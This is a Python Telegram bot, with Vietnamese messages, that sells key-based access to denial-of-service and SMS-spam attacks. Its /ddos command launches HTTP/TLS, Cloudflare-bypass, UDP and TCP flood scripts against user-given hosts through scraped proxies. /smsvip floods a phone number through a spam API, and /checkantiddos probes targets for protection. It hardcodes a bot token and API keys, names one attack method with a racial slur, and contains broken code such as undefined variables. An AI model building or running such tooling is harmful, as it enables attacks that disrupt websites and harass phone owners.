from contextvars import copy_context
from copy import copy
import copyreg
import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading

bot_token = '6382613190:AAFLlMS-rO5w5IvnMMqqixCgpd6gVvoZh6E'

bot = telebot.TeleBot(bot_token)

allowed_group_id = -1001723089040

allowed_users = [6412130255]
processes = []
ADMIN_ID = 6412130255
proxy_update_count = 0
last_proxy_update_time = time.time()
key_dict = {}

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_
 INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
@bot.message_handler(commands=['adduser'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'Chi Dành Cho Admin')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Nhập Đúng Định Dạng /adduser + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Đã Thêm Người Dùng Có ID Là: {user_id} Sử Dụng Lệnh 30 Ngày')


load_users_from_database()

@bot.message_handler(commands=['getkey'])
def laykey(message):
    bot.reply_to(message, text='✔ Key miễn phí không vượt link ✔')

    with open('key.txt', 'a') as f:
        f.close()

    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    key = str(hash_object.hexdigest())
    print(key)
    
    try:
        response = requests.get(f'https://link4m.co/api-shorten/v2?api=64e1c3758727ac1c1237ae7a&url=https://www.getkey.elementfx.com/?key={key}')
        response_json = response.json()
        if 'shortenedUrl' in response_json:
            url_key = response_json['shortenedUrl']
        else:
            url_key = "Lấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh /getkey Key sẽ xuất hiện trên url"
    except requests.exceptions.RequestException as e:
        url_key = "FLấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh /getkey Key sẽ xuất hiện trên url"
    
    text = f'''

{key}

    '''
    bot.reply_to(message, text)

@bot.message_handler(commands=['key'])
def key(message):
    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Vui Lòng Nhập Key\nVí Dụ /key botvipvcl\nSử Dụng Lệnh /getkey Để Lấy Key')
        return
    bot.send_message(bot_chat_id, {key}, parse_mode='MarkdownV2') #chat_id is another unique identifier
    user_id = message.from_user.id

    key = message.text.split()[1]
    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    expected_key = str(hash_object.hexdigest())
    if key == expected_key:
        allowed_users.append(user_id)
        bot.reply_to(message, 'Nhập Key Thành Công')
    else:
        bot.reply_to(message, 'Key Sai Hoặc Hết Hạn\nKhông Sử Dụng Key Của Người Khác!')


@bot.message_handler(commands=['startbot', 'help'])
def help(message):
    help_text = '''
📌 Tất Cả Các Lệnh 📌
1️⃣ Lệnh Lấy Key Và Nhập Key
- /getkey : Để lấy key 🔐
- /key + [Key] : Kích Hoạt Key 🔓
2️⃣ Lệnh Spam ☎
- /smsvip + [Số Điện Thoại] : Spam VIP ☎ 💸
- /statusspam : số quy trình đang chạy ☎
3️⃣ Lệnh DDoS ( Tấn Công Website )
- /ddos + [methods] + [host] 💣
- /methods : Để Xem Methods ✔
- /checkantiddos + [host] : Kiểm Tra AntiDDoS 👀
- /checkproxy : Check Số Lượng Proxy 🌌
- /scan : Để update proxy bằng api 💸
4️⃣ Lệnh Có Ích ^^
- /getcode + [host] : Lấy Source Code Website📝
- /updateproxy : Proxy Sẽ Tự Động Update Sau 10 Phút
[ Proxy Live 95% Die 5 % ]🤖
- /uptime : Số Thời Gian Bot Hoạt Động ⏰
5️⃣ Info Admin
- /muakeyvip : Để Mua Key VIP 💸
- /adminbot : Info Admin 🤯
- /onbot : On Bot🔐
- /offbot : Off Bot🔐
- /checkcpu : Xem tài nguyên cpu 💾
- /uptime : Thời gian hoạt động của bot ⏰
'''
    bot.reply_to(message, help_text)
    
is_bot_active = True
@bot.message_handler(commands=['smsvip'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /getkey để lấy Key')
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /smsvip + [số điện thoại]')
        return

    username = message.from_user.username

    args = message.text.split()
    phone_number = args[1]

    blocked_numbers = ['113', '114', '115', '198', '911', '0384955612']
    if phone_number in blocked_numbers:
        bot.reply_to(message, 'Ngu à mày spam có mà đi tù.')
        return

    if user_id in cooldown_dict and time.time() - cooldown_dict[user_id] < 1:
        remaining_time = int(1 - (time.time() - cooldown_dict[user_id]))
        bot.reply_to(message, f'Vui lòng đợi {remaining_time} giây trước khi tiếp tục sử dụng lệnh này.')
        return
    
    cooldown_dict[user_id] = time.time()

    username = message.from_user.username

    bot.reply_to(message, f'@{username} Đang Tiến Hành Spam')

    args = message.text.split()
    phone_number = args[1]

    # Gửi dữ liệu tới api
    url = f"https://api.viduchung.info/spam-sms/?key=cardvip247&phone={phone_number}"
    response = requests.get(url)
    file_path = os.path.join(os.getcwd(), "sms.py")
    process = subprocess.Popen(["python", file_path, phone_number, "240"])
    processes.append(process)

    bot.reply_to(message, f'┏━━━━━━━━━━━━━━━━━━┓\n┣➤ 🚀 Gửi Yêu Cầu Tấn Công Thành Công 🚀 \n┣➤ Bot 👾: @botgura_bot \n┣➤ Số Tấn Công 📱: [ {phone_number} ]\nThời gian 🕐: 240s ✅\n┗━━━━━━━━━━━━━━━━━━┛\n')
 

@bot.message_handler(commands=['statusspam'])
def status(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, '🚀Ngu à mày dell có đẳng cấp để sài lệnh này.🚀')
        return
    process_count = len(processes)
    bot.reply_to(message, f'🚀Số quy trình đang chạy:🚀 {process_count}.')
    

@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
📌 Tất Cả Methods:
🚀 Layer7 🚀
[ Không tấn công các trang web có tên miền Gob, Gov, Edu ]
TLS ( Power full )           
DESTROY ( Power full )  
TLSV2 ( Power full )  
FLOOD-BYPASS ( Power full ) 
CF-BYPASS ( Normal )
FLOOD-BYPASS ( Normal )
SKYNET ( Normal )
NIGGER ( Normal )
GOD ( Normal )               
TLSV1 ( Normal )     
HTTP-TLS ( Normal )    
HTTP-RAW ( Quite weak ) 
HTTP-SOCKET ( Quite weak )
HTTP-GET ( Quite weak )
HTTP-FLOOD ( Quite weak )
🚀 Layer4 🚀
[ Không tấn công các trang web có tên miền Gob, Gov, Edu ]
TCP-FLOOD ( Normal )
UDP-FLOOD ( Normal )
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công, Cảm Ơn Bạn Đã Sử Dụng")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['ddos'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập checkKey\nSử dụng lệnh /getkey để lấy Key')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /ddos + [method] + [host]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 1:
        remaining_time = int(1 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /ddos.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    if method in ['UDP-FLOOD', 'TCP-FLOOD'] and len(args) < 4:
        bot.reply_to(message, f'Vui lòng nhập cả port.\nVí dụ: /attack {method} {host} [port]')
        return

    if method in ['UDP-FLOOD', 'TCP-FLOOD']:
        port = args[3]
    else:
        port = None

    blocked_domains = ["chinhphu.vn", ".gov", ".edu", ".gob", ".www", ".violet", "ngocphong.com", "minhkhue.link", "onlytris.name.vn"]   
    if method == 'TLS' or method == 'DESTROY' or method == 'CF-BYPASS' or method == 'TLSV1' or method == 'GOD' or method == 'UDP-FLOOD' or method == 'HTTP-FLOOD' or method == 'HTTP-TLS' or method == 'HTTP-SOCKET' or method == 'HTTP-GET' or method == 'HTTP-RAW' or method == 'TLS-BYPASS' or method == 'FLOOD-BYPASS   ' or method == 'NIGGER' :
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Mày ngu à, không thấy tên miền {blocked_domain}")
                return

    if method in ['TLS', 'GOD', 'DESTROY', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD','TLSV1', 'HTTP-TLS', 'HTTP-RAW', 'HTTP-SOCKET', 'HTTP-GET', 'HTTP-FLOOD', "NIGGER", "TLS-BYPASS", "FLOOD-BYPASS", "SKYNET"]:
        # Update the command and duration based on the selected method
        if method == 'TLS':
            command = ["node", "TLS.js", host, "120", "100", "100"]
            duration = 120
        elif method == 'GOD':
            command = ["node", "GOD.js", host, "120", "100", "100"]
            duration = 120
        elif method == 'DESTROY':
            command = ["node", "DESTROY.js", host, "120", "100", "100", "proxy.txt"]
            duration = 120
        elif method == 'CF-BYPASS':
            command = ["node", "CFBYPASS.js", host, "120", "100", "100", "proxy.txt"]
            duration = 120
        elif method == 'TLSV1':
            command = ["node", "TLSV1.js", host,"GET","proxy.txt","120", "100", "100"]
            duration = 120
        elif method == 'HTTP-RAW':
            command = ["node", "HTTP-RAW.js", host, "120"]
            duration = 120
        elif method == 'HTTP-GET':
            command = ["node", "HTTP-GET.js", host, "120", "GET"]
            duration = 120 
        elif method == 'HTTP-SOCKET':
            command = ["node", "HTTP-SOCKET.js", host, "1000", "120"]
            duration = 120
        elif method == 'HTTP-TLS':
            command = ["node", "HTTP-TLS.js", host,"120", "64", "100", "proxy.txt"]
            duration = 120
        elif method == 'HTTP-FLOOD':
            command = ["node", "HTTP-FLOOD.js", host, "120"]
            duration = 120
        elif method == 'TLS-BYPASS':
            command = ["node", "TLS-BYPASS.js", host, "120", "100", "proxy.txt", "64"]
            duration = 120
        elif method == 'NIGGER':
            command = ["node", "NIGGER.js", host, "120", "64", "100", "proxy.txt"]
            duration = 120   
        elif method == 'FLOOD-BYPASS.js':
            command = ["node", "FLOOD-BYPASS.js", host, "120", "100", "proxy.txt", "64"]
            duration = 120
        elif method == 'SKYNET.js':
            command = ["node", "SKYNET.js", host, "120", "64", "100", "proxy.txt"]
            duration = 120
        elif method == 'UDP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = ["python", "udp.py", host, port, "120", "100", "100"]
            duration = 120
        elif method == 'TCP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = ["python", "tcp.py", host, port, "120", "100", "100"]
            duration = 120

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'┏━━━━━━━━━━━━━━➤\n┃  💣 Successful Attack!!!💣\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━➤\n┣➤ Attack By: @{username} \n┣➤ Host: {host} \n┣➤ Methods: {method} \n┣➤ Time: {duration} Giây\n┣➤ Admin : Tũn 👀🍀\n┣➤ Check host : https://check-host.net/check-http?host={host}\n┗━━━━━━━━━━━━━━➤')
    else:
        bot.reply_to(message, 'Phương thức tấn công không hợp lệ. Sử dụng lệnh /methods để xem phương thức tấn công')

@bot.message_handler(commands=['checkproxy'])
def proxy_command(message):
    user_id = message.from_user.id
    if user_id in allowed_users:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                bot.reply_to(message, f"Số lượng proxy: {num_proxies}")
        except FileNotFoundError:
            bot.reply_to(message, "Không tìm thấy file proxy.txt.")
    else:
        bot.reply_to(message, 'Ngu à mày dell có đẳng cấp để sài lệnh này.')

def send_proxy_update():
    while True:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                proxy_update_message = f"Số proxy mới update là: {num_proxies}"
                bot.send_message(allowed_group_id, proxy_update_message)
        except FileNotFoundError:
            pass
        time.sleep(3600)  # Wait for 10 minutes

@bot.message_handler(commands=['checkcpu'])
def check_cpu(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Ngu à mày dell có đẳng cấp để sài lệnh này.')
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')

@bot.message_handler(commands=['offbot'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Ngu à mày dell có đẳng cấp để sài lệnh này.')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'Bot đã được tắt. Tất cả người dùng không thể sử dụng lệnh khác.')

@bot.message_handler(commands=['onbot'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Ngu à mày dell có đẳng cấp để sài lệnh này.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'Bot đã được khởi động lại. Tất cả người dùng có thể sử dụng lại lệnh bình thường.')

is_bot_active = True
@bot.message_handler(commands=['getcode'])
def code(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập checkKey\nSử dụng lệnh /getkey để lấy Key')
        return
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /getcode + [link website]')
        return

    url = message.text.split()[1]

    try:
        response = requests.get(url)
        if response.status_code != 200:
            bot.reply_to(message, 'Không thể lấy mã nguồn từ trang web này. Vui lòng kiểm tra lại URL.')
            return

        content_type = response.headers.get('content-type', '').split(';')[0]
        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
            bot.reply_to(message, 'Trang web không phải là HTML hoặc PHP. Vui lòng thử với URL trang web chứa file HTML hoặc PHP.')
            return

        source_code = response.text

        zip_file = io.BytesIO()
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.writestr("source_code.txt", source_code)

        zip_file.seek(0)
        bot.send_chat_action(message.chat.id, 'upload_document')
        bot.send_document(message.chat.id, zip_file)

    except Exception as e:
        bot.reply_to(message, f'Có lỗi xảy ra: {str(e)}')

@bot.message_handler(commands=['checkantiddos'])
def check_ip(message):
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /check + [link website]')
        return

    url = message.text.split()[1]
    
    # Kiểm tra xem URL có http/https chưa, nếu chưa thêm vào
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    # Loại bỏ tiền tố "www" nếu có
    url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
    
    try:
        ip_list = socket.gethostbyname_ex(url)[2]
        ip_count = len(ip_list)

        reply = f"Ip của website: {url}\nLà: {', '.join(ip_list)}\n"
        if ip_count == 1:
            reply += "Website có 1 ip có khả năng không antiddos."
        else:
            reply += "Website có nhiều hơn 1 ip khả năng antiddos rất cao.\nKhông thể tấn công website này."

        bot.reply_to(message, reply)
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")

@bot.message_handler(commands=['adminbot'])
def send_admin_link(message):
    bot.reply_to(message, "Telegram: Tũn 👀🍀")
@bot.message_handler(commands=['muakeyvip'])
def send_admin_link(message):
    bot.reply_to(message, "Inbox Admin Để Mua Key Vip Giá 5000đ/15 ngày . Telegram : Tũn 👀🍀")
@bot.message_handler(commands=['sms'])
def sms(message):
    pass


# Hàm tính thời gian hoạt động của bot
start_time = time.time()

proxy_update_count = 0
proxy_update_interval = 600 

@bot.message_handler(commands=['updateproxy'])
def get_proxy_info(message):
    user_id = message.from_user.id
    global proxy_update_count

    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /getkey để lấy Key')
        return

    try:
        with open("proxy.txt", "r") as proxy_file:
            proxy_list = proxy_file.readlines()
            proxy_list = [proxy.strip() for proxy in proxy_list]
            proxy_count = len(proxy_list)
            proxy_message = f'10 Phút Tự Update\nSố lượng proxy: {proxy_count}\n'
            bot.send_message(message.chat.id, proxy_message)
            bot.send_document(message.chat.id, open("proxy.txt", "rb"))
            proxy_update_count += 1
    except FileNotFoundError:
        bot.reply_to(message, "Không tìm thấy file proxy.txt.")

@bot.message_handler(commands=['uptime'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} giờ, {minutes} phút, {seconds} giây'
    bot.reply_to(message, f'Bot Đã Hoạt Động Được: {uptime_str}')

@bot.message_handler(commands=['scan'])
def handle_scan(message):
    try:
        # Lấy số lần muốn scan từ tin nhắn của người dùng
        args = message.text.split()
        if len(args) < 2:
            bot.send_message(message.chat.id, "Vui lòng nhập số lần muốn scan, ví dụ: /scan 5")
            return

        num_scans = int(args[1])
        proxy_list = []

        api_url = 'https://api.thanhdieu.com/get-proxy.php?classify=http&key=binhvn'

        for _ in range(num_scans):
            response = requests.get(api_url)
            
            if response.status_code == 200:
                data = response.text
                cleaned_data = re.sub(r'[^0-9.: ]', '', data)
                proxy_list.extend(cleaned_data.strip().split())

        # Xóa 20 dòng đầu của danh sách proxy
        proxy_list = proxy_list[20:]

        with open('proxy.txt', 'w', encoding='utf-8') as proxy_file:
            proxy_file.write('\n'.join(proxy_list))

        bot.send_message(message.chat.id, 'Udate xng r nha thk buồi')

    except Exception as e:
        bot.send_message(message.chat.id, f'Có lỗi xảy ra: {str(e)}')


@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, 'Lệnh không hợp lệ. Vui lòng sử dụng lệnh /help để xem danh sách lệnh.')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
